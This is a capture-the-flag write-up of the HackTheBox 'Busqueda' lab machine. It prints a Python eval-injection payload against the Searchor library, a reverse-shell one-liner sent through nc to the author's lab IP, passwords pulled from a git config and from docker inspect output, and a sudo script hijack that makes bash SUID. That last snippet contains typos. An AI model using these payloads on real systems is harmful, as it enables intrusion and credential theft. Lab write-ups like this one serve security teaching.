---
layout: post
title: "HTB: Busqueda"
author: Andrew Cherney
date: 2023-08-12 16:14:08
tags: htb easy-box linux webapp python 
icon: "assets/icons/busqueda.png"
post_description: "Much like RedPanda this box starts with exploiting a search engine. I hope your python is up to the test. Next we look for an exploit using docker inspect to get into a git repo and gain access to private scripts running on the machine, which are then exploited for root."
---

<h1>Summary</h1>

{{ page.post_description }}

<h2>Enumeration</h2>

<h3>nmap</h3>

```
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Busqueda]
└──╼ $nmap -sC 10.10.11.208
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 16:34 CDT
Nmap scan report for 10.10.11.208
Host is up (0.056s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://searcher.htb/
```

```bash
echo '10.10.11.208 searcher.htb' >> /etc/hosts
```

<h3>Port 80 - http</h3>

![front page](/img/busqueda/front_page.png)

![/search](/img/busqueda/search.png)

This page appears to be a universal searcher where you specify a platform and it returns a web address which you can enter as an address to perform your search. The endpoint that you are redirected to is **/search**. Now I've already got a small lead from the footer of the front page. This is run in Flask and using the [Searchor github repo](https://github.com/ArjunSharda/Searchor).

<h2>User as svc</h2>

<h3>Python Code Escape</h3>

If I skim that repo I can find that the basic functionality of this site is to use that repo to search various sites and return the url for that search. The cursory search of vulnerabilities for this repo turn up [this arbitrary code execution on version 2.4.2](https://security.snyk.io/package/pip/searchor/2.4.0). The crux is our old friend improper eval usage as seen below:

```python
url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

Commonly a way to escape python code through the eval function is to import os and use popen to run commands. Let's see what comes from that.

```
'+__import__("os").popen("id").read()+'
https://www.google.com/maps/search/uid%3D1000%28svc%29%20gid%3D1000%28svc%29%20groups%3D1000%28svc%29%0A
```

It works! Now I replace id with a reverse shell and gain my foothold.

```
'+__import__("os").popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 7777 >/tmp/f").read()+'
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Busqueda]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.208] 50910
bash: cannot set terminal process group (1641): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
whoami
svc
svc@busqueda:~$ cat user.txt
cat user.txt
113ea983d7b15-------------------
```

<h2>Root</h2>

<h3>Git Config</h3>

I run a linpeas and it throws off some interesting information. Firstly the **/home/svc/.local/bin** directory is in the path environment variable. If there is a script or command that runs another command or script from one of the path directories I can intercept that request and run my code as whatever user runs the script/command calling it (ideally root). Other basic things include DirtyPipe, Pwnkit, sudo Baron Samedit 1 and 2, and Netfilter heap out-of-bounds write. 

Before looking into any of those there are two .git directories:

```
drwxr-x--- 8 root root 4096 Apr  3 15:04 /opt/scripts/.git
drwxr-xr-x 8 www-data www-data 4096 May 14 18:08 /var/www/app/.git
```

I have access to the one inside of /var/www/app, so I'll crack open that juicy config file and see what we have. 

```
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Oh sweet wompums look at that password **jh1usoih2bkjaspwe92**. Now I can toss out a **sudo -l** to see what our user "cody" can do as root. 

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

<h3>Gitea</h3>

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 8 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 8 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Two things pop out here, one is that here is a mysql database for a locally running webpage, and the other is that there is some other hosted site that we might be able to enumerate. Luckily inside of /etc/hosts on this machine I found **gitea.searcher.htb**. In retrospect the credentials for cody also mentioned this subdomain. 

![gitea page](/img/busqueda/gitea.png)

![gitea login](/img/busqueda/gitea_login.png)

![cody gitea](/img/busqueda/cody_gitea.png)

It seems we have another user for this specific service named administrator. Those credentials are certainly inside of the mysql database listed with our sudo access. Now all we need to do is figure out how to interact with that database. 

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --'{{.Config.Image}}' gitea
--gitea/gitea:latest
```

I found a basic use case [for the command here](https://docs.docker.com/engine/reference/commandline/inspect/), it pretty closely follows the regular docker inspect command. At the bottom of that page is the payload <code>docker inspect --format='{{json .Config}}' $INSTANCE_ID</code> and I intend to see if that works.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --'{{json .Config}}' gitea
--{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

Oh hey it did work. And if you squint hard enough you can make out the administrator password is **yuiu1hoiu4i5ho1uh**. 

![admin gitea](/img/busqueda/admin_gitea.png)

![scripts repo](/img/busqueda/scripts_repo.png)

And would you look at that cool scripts directory with identical scripts to the /opt/scripts directory on the machine. Taking a small peek at one of the scripts that didn't work when I tried is I find my ticket to root. 

<h3>Code Exploitation</h3>

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

Checking the full-checkup option of the code I can run as sudo I see that the option only checks for a local file then runs it as root. I can make the file modify /bin/bash to be an suid and then I will obtain root. 

```bash
!#/bin/bash
chmod +s /bin.bash
```

```bash
svc@busqueda:~$ nano full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
c0c2d4933301--------------------
```
